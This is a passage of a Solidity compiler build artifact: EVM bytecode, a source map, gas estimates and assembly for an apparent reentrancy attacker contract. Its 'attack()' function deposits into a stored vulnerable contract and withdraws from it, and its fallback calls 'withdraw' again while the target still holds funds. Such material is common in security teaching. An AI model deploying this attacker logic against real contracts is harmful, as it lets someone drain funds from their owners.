SWAP2 POP DUP2 ISZERO ISZERO PUSH2 0x336 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0xE DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x4465706F736974206661696C6564000000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD DUP1 DUP1 PUSH32 0x77697468647261772875696E7432353629000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x11 ADD SWAP1 POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 KECCAK256 PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL SWAP3 POP POP POP SWAP1 POP DUP1 ISZERO ISZERO PUSH2 0x486 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0xF DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x5769746864726177206661696C65640000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 0xda PUSH5 0xD2F9DB30C0 MLOAD SWAP14 JUMP LOG0 0xee 0xaf 0xfc 0x5e JUMPDEST 0x1e 0xfc ISZERO 0xcd KECCAK256 0x5e 0xbd DIV 0x23 PUSH9 0x85C0BC473DDD002900 ",
							"sourceMap": "28:1159:0:-;;;;;;;;;;;;;;;;;;;;;;;;;;1010:20;984:9;953:18;;;;;;;;;;;945:35;;;:48;;941:236;;;1033:18;;;;;;;;;;;:23;;1064:30;;;;;;;;;;;;;;;;;;;1033:74;;;1097:9;1033:74;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1010:97;;1130:15;1122:43;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;941:236;798:386;28:1159;51:33;;8:9:-1;5:2;;;30:1;27;20:12;5:2;51:33:0;;;;;;;;;;;;;;;;;;;;;;;;;;;208:518;;;;;;51:33;;;;;;;;;;;;;:::o;208:518::-;337:19;567:20;359:18;;;;;;;;;;;:23;;389:9;359:44;;;;;;;;;;;;;;;;;;;;;;337:66;;422:14;414:41;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;590:18;;;;;;;;;;;:23;;621:30;;;;;;;;;;;;;;;;;;;590:74;;;654:9;590:74;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;567:97;;683:15;675:43;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;208:518;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "241200",
								"executionCost": "20634",
								"totalCost": "261834"
							},
							"external": {
								"": "infinite",
								"attack()": "infinite",
								"vulnerableContract()": "442"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 28,
									"end": 1187,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 28,
									"end": 1187,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 28,
									"end": 1187,
									"name": "MSTORE"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "CALLVALUE"
								},
								{
									"begin": 8,
									"end": 17,
									"name": "DUP1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "ISZERO"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPI"
								},
								{
									"begin": 30,
									"end": 31,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 27,
									"end": 28,
									"name": "DUP1"
								},
								{
									"begin": 20,
									"end": 32,
									"name": "REVERT"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPDEST"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "POP"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "MLOAD"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "PUSH",
									"value": "20"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "DUP1"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "PUSHSIZE"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "DUP4"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "CODECOPY"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "DUP2"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "ADD"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "DUP1"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "MSTORE"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "DUP2"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "ADD"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "SWAP1"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "DUP1"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "DUP1"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "MLOAD"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "SWAP1"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "PUSH",
									"value": "20"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "ADD"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "SWAP1"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "SWAP3"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "SWAP2"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "SWAP1"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "POP"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "POP"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "POP"
								},
								{
									"begin": 173,
									"end": 192,
									"name": "DUP1"
								},
								{
									"begin": 152,
									"end": 170,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 152,
									"end": 170,
									"name": "DUP1"
								},
								{
									"begin": 152,
									"end": 192,
									"name": "PUSH",
									"value": "100"
								},
								{
									"begin": 152,
									"end": 192,
									"name": "EXP"
								},
								{
									"begin": 152,
									"end": 192,
									"name": "DUP2"
								},
								{
									"begin": 152,
									"end": 192,
									"name": "SLOAD"
								},
								{
									"begin": 152,
									"end": 192,
									"name": "DUP2"
								},
								{
									"begin": 152,
									"end": 192,
									"name": "PUSH",
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 152,
									"end": 192,
									"name": "MUL"
								},
								{
									"begin": 152,
									"end": 192,
									"name": "NOT"
								},
								{
									"begin": 152,
									"end": 192,
									"name": "AND"
								},
								{
									"begin": 152,
									"end": 192,
									"name": "SWAP1"
								},
								{
									"begin": 152,
									"end": 192,
									"name": "DUP4"
								},
								{
									"begin": 152,
									"end": 192,
									"name": "PUSH",
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 152,
									"end": 192,
									"name": "AND"
								},
								{
									"begin": 152,
									"end": 192,
									"name": "MUL"
								},
								{
									"begin": 152,
									"end": 192,
									"name": "OR"
								},
								{
									"begin": 152,
									"end": 192,
									"name": "SWAP1"
								},
								{
									"begin": 152,
									"end": 192,
									"name": "SSTORE"
								},
								{
									"begin": 152,
									"end": 192,
									"name": "POP"
								},
								{
									"begin": 93,
									"end": 200,
									"name": "POP"
								},
								{
									"begin": 28,
									"end": 1187,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 28,
									"end": 1187,
									"name": "DUP1"
								},
								{
									"begin": 28,
									"end": 1187,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 28,
									"end": 1187,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 28,
									"end": 1187,
									"name": "CODECOPY"
								},
								{
									"begin": 28,
									"end": 1187,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 28,
									"end": 1187,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a165627a7a72305820da64d2f9db30c0519d56a0eeaffc5e5b1efc15cd205ebd04236885c0bc473ddd0029",
									".code": [
										{
											"begin": 28,
											"end": 1187,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 28,
											"end": 1187,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 28,
											"end": 1187,
											"name": "MSTORE"
										},
										{
											"begin": 28,
											"end": 1187,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 28,
											"end": 1187,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 28,
											"end": 1187,
											"name": "LT"
										},
										{
											"begin": 28,
											"end": 1187,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 28,
											"end": 1187,
											"name": "JUMPI"
										},
										{
											"begin": 28,
											"end": 1187,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 28,
											"end": 1187,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 28,
											"end": 1187,
											"name": "PUSH",
											"value": "100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 28,
											"end": 1187,
											"name": "SWAP1"
										},
										{
											"begin": 28,
											"end": 1187,
											"name": "DIV"
										},
										{
											"begin": 28,
											"end": 1187,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 28,
											"end": 1187,
											"name": "AND"
										},
										{
											"begin": 28,
											"end": 1187,
											"name": "DUP1"
										},
										{
											"begin": 28,
											"end": 1187,
											"name": "PUSH",
											"value": "144166AE"
										},
										{
											"begin": 28,
											"end": 1187,
											"name": "EQ"
										},
										{
											"begin": 28,
											"end": 1187,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 28,
											"end": 1187,
											"name": "JUMPI"
										},
										{
											"begin": 28,
											"end": 1187,
											"name": "DUP1"
										},
										{
											"begin": 28,
											"end": 1187,
											"name": "PUSH",
											"value": "9E5FAAFC"
										},
										{
											"begin": 28,
											"end": 1187,
											"name": "EQ"
										},
										{
											"begin": 28,
											"end": 1187,
											"name": "PUSH [tag]",
											"value": "3"
										},
										{
											"begin": 28,
											"end": 1187,
											"name": "JUMPI"
										},
										{
											"begin": 28,
											"end": 1187,
											"name": "tag",
											"value": "1"
										},
										{
											"begin": 28,
											"end": 1187,
											"name": "JUMPDEST"
										},
										{
											"begin": 1010,
											"end": 1030,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 984,
											"end": 993,
											"name": "CALLVALUE"
										},
										{
											"begin": 953,
											"end": 971,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 953,
											"end": 971,
											"name": "DUP1"
										},
										{
											"begin": 953,
											"end": 971,
											"name": "SWAP1"
										},
										{
											"begin": 953,
											"end": 971,
											"name": "SLOAD"
										},
										{
											"begin": 953,
											"end": 971,
											"name": "SWAP1"
										},
										{
											"begin": 953,
											"end": 971,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 953,
											"end": 971,
											"name": "EXP"
										},
										{
											"begin": 953,
											"end": 971,
											"name": "SWAP1"
										},
										{
											"begin": 953,
											"end": 971,
											"name": "DIV"
										},
										{
											"begin": 953,
											"end": 971,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 953,
											"end": 971,
											"name": "AND"
										},
										{
											"begin": 945,
											"end": 980,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 945,
											"end": 980,
											"name": "AND"
										},
										{
											"begin": 945,
											"end": 980,
											"name": "BALANCE"
										},
										{
											"begin": 945,
											"end": 993,
											"name": "LT"
										},
										{
											"begin": 945,
											"end": 993,
											"name": "ISZERO"
										},
										{
											"begin": 941,
											"end": 1177,
											"name": "ISZERO"
										},
										{
											"begin": 941,
											"end": 1177,
											"name": "PUSH [tag]",
											"value": "6"
										},
										{
											"begin": 941,
											"end": 1177,
											"name": "JUMPI"
										},
										{
											"begin": 1033,
											"end": 1051,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1033,
											"end": 1051,
											"name": "DUP1"
										},
										{
											"begin": 1033,
											"end": 1051,
											"name": "SWAP1"
										},
										{
											"begin": 1033,
											"end": 1051,
											"name": "SLOAD"
										},
										{
											"begin": 1033,
											"end": 1051,
											"name": "SWAP1"
										},
										{
											"begin": 1033,
											"end": 1051,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 1033,
											"end": 1051,
											"name": "EXP"
										},
										{
											"begin": 1033,
											"end": 1051,
											"name": "SWAP1"
										},
										{
											"begin": 1033,
											"end": 1051,
											"name": "DIV"
										},
										{
											"begin": 1033,
											"end": 1051,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1033,
											"end": 1051,
											"name": "AND"
										},
										{
											"begin": 1033,
											"end": 1056,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1033,
											"end": 1056,
											"name": "AND"
										},
										{
											"begin": 1064,
											"end": 1094,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1064,
											"end": 1094,
											"name": "MLOAD"
										},
										{
											"begin": 1064,
											"end": 1094,
											"name": "DUP1"
										},
										{
											"begin": 1064,
											"end": 1094,
											"name": "DUP1"
										},
										{
											"begin": 1064,
											"end": 1094,
											"name": "PUSH",
											"value": "77697468647261772875696E7432353629000000000000000000000000000000"
										},
										{
											"begin": 1064,
											"end": 1094,
											"name": "DUP2"
										},
										{
											"begin": 1064,
											"end": 1094,
											"name": "MSTORE"
										},
										{
											"begin": 1064,
											"end": 1094,
											"name": "POP"
										},
										{
											"begin": 1064,
											"end": 1094,
											"name": "PUSH",
											"value": "11"
										},
										{
											"begin": 1064,
											"end": 1094,
											"name": "ADD"
										},
										{
											"begin": 1064,
											"end": 1094,
											"name": "SWAP1"
										},
										{
											"begin": 1064,
											"end": 1094,
											"name": "POP"
										},
										{
											"begin": 1064,
											"end": 1094,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1064,
											"end": 1094,
											"name": "MLOAD"
										},
										{
											"begin": 1064,
											"end": 1094,
											"name": "DUP1"
										},
										{
											"begin": 1064,
											"end": 1094,
											"name": "SWAP2"
										},
										{
											"begin": 1064,
											"end": 1094,
											"name": "SUB"
										},
										{
											"begin": 1064,
											"end": 1094,
											"name": "SWAP1"
										},
										{
											"begin": 1064,
											"end": 1094,
											"name": "KECCAK256"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "PUSH",
											"value": "100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "SWAP1"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "DIV"
										},
										{
											"begin": 1097,
											"end": 1106,
											"name": "CALLVALUE"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "MLOAD"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "DUP3"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "AND"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "PUSH",
											"value": "100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "MUL"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "DUP2"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "MSTORE"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "ADD"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "DUP1"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "DUP3"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "DUP2"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "MSTORE"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "ADD"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "SWAP2"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "POP"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "POP"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "MLOAD"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "DUP1"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "DUP4"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "SUB"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "DUP2"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "DUP8"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "GAS"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "CALL"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "SWAP3"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "POP"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "POP"
										},
										{
											"begin": 1033,
											"end": 1107,
											"name": "POP"
										},
										{
											"begin": 1010,
											"end": 1107,
											"name": "SWAP1"
										},
										{
											"begin": 1010,
											"end": 1107,
											"name": "POP"
										},
										{
											"begin": 1130,
											"end": 1145,
											"name": "DUP1"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "ISZERO"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "ISZERO"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "PUSH [tag]",
											"value": "7"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "JUMPI"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "MLOAD"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "PUSH",
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "DUP2"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "MSTORE"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "ADD"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "DUP1"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "DUP1"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "ADD"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "DUP3"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "DUP2"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "SUB"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "DUP3"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "MSTORE"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "DUP2"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "MSTORE"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "ADD"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "DUP1"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "PUSH",
											"value": "5769746864726177206661696C65640000000000000000000000000000000000"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "DUP2"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "MSTORE"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "POP"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "ADD"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "SWAP2"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "POP"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "POP"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "MLOAD"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "DUP1"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "SWAP2"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "SUB"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "SWAP1"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "REVERT"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "tag",
											"value": "7"
										},
										{
											"begin": 1122,
											"end": 1165,
											"name": "JUMPDEST"
										},
										{
											"begin": 941,
											"end": 1177,
											"name": "tag",
											"value": "6"
										},
										{
											"begin": 941,
											"end": 1177,
											"name": "JUMPDEST"
										},
										{
											"begin": 798,
											"end": 1184,
											"name": "POP"
										},
										{
											"begin": 28,
											"end": 1187,
											"name": "STOP"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "tag",
											"value": "2"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "JUMPDEST"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "8"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "8"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "POP"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "PUSH [tag]",
											"value": "9"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "PUSH [tag]",
											"value": "10"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "JUMP"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "tag",
											"value": "9"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "JUMPDEST"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "MLOAD"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "DUP1"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "DUP3"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "AND"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "AND"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "DUP2"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "MSTORE"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "ADD"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "SWAP2"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "POP"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "POP"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "MLOAD"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "DUP1"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "SWAP2"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "SUB"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "SWAP1"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "RETURN"
										},
										{
											"begin": 208,
											"end": 726,
											"name": "tag",
											"value": "3"
										},
										{
											"begin": 208,
											"end": 726,
											"name": "JUMPDEST"
										},
										{
											"begin": 208,
											"end": 726,
											"name": "PUSH [tag]",
											"value": "11"
										},
										{
											"begin": 208,
											"end": 726,
											"name": "PUSH [tag]",
											"value": "12"
										},
										{
											"begin": 208,
											"end": 726,
											"name": "JUMP"
										},
										{
											"begin": 208,
											"end": 726,
											"name": "tag",
											"value": "11"
										},
										{
											"begin": 208,
											"end": 726,
											"name": "JUMPDEST"
										},
										{
											"begin": 208,
											"end": 726,
											"name": "STOP"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "tag",
											"value": "10"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "JUMPDEST"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "DUP1"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "SWAP1"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "SLOAD"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "SWAP1"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "EXP"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "SWAP1"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "DIV"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "AND"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "DUP2"
										},
										{
											"begin": 51,
											"end": 84,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 208,
											"end": 726,
											"name": "tag",
											"value": "12"
										},
										{
											"begin": 208,
											"end": 726,
											"name": "JUMPDEST"
										},
										{
											"begin": 337,
											"end": 356,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 567,
											"end": 587,
											"name": "DUP1"
										},
										{
											"begin": 359,
											"end": 377,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 359,
											"end": 377,
											"name": "DUP1"
										},
										{
											"begin": 359,
											"end": 377,
											"name": "SWAP1"
										},
										{
											"begin": 359,
											"end": 377,
											"name": "SLOAD"
										},
										{
											"begin": 359,
											"end": 377,
											"name": "SWAP1"
										},
										{
											"begin": 359,
											"end": 377,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 359,
											"end": 377,
											"name": "EXP"
										},
										{
											"begin": 359,
											"end": 377,
											"name": "SWAP1"
										},
										{
											"begin": 359,
											"end": 377,
											"name": "DIV"
										},
										{
											"begin": 359,
											"end": 377,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 359,
											"end": 377,
											"name": "AND"
										},
										{
											"begin": 359,
											"end": 382,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 359,
											"end": 382,
											"name": "AND"
										},
										{
											"begin": 389,
											"end": 398,
											"name": "CALLVALUE"
										},
										{
											"begin": 359,
											"end": 403,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 359,
											"end": 403,
											"name": "MLOAD"
										},
										{
											"begin": 359,
											"end": 403,
											"name": "DUP1"
										},
										{
											"begin": 359,
											"end": 403,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 359,
											"end": 403,
											"name": "ADD"
										},
										{
											"begin": 359,
											"end": 403,
											"name": "SWAP1"
